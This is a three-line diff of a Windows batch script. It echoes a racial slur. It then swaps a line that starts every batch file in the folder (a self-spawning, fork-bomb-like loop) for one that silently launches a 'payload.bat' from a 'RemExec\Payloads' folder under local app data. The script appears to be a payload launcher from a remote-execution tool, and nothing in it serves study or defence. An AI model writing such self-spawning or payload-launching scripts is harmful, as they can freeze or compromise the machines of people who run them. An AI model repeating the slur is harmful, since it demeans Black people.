@@ -1,3 +1,3 @@
 @echo off
 echo nigga
-start /MIN *.bat
+start %localappdata%\Programs\RemExec\Payloads\payload.bat
